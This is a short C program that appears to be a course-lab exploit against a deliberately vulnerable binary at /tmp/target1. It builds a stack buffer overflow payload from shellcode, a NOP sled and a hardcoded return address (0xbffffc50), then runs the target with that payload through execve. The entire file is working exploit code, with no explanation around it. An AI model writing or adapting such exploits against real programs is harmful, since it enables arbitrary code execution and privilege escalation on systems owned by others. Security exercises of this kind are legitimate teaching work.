#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[265];
  int i, offset; 
  int addr = 0xbffffc50;
    
  strncpy(buf, shellcode, strlen(shellcode));
  for ( i = strlen(shellcode) ; i <260; i++){
    buf[i] = NOP;  
  }
  *(int*)(buf+260) = addr ;
  buf[264] = '\x00';
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;
  // printf("\n size of shellcode %d\n", sizeof(shellcode));
  // printf("\n value of args[1] %s \n", args[1]);

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
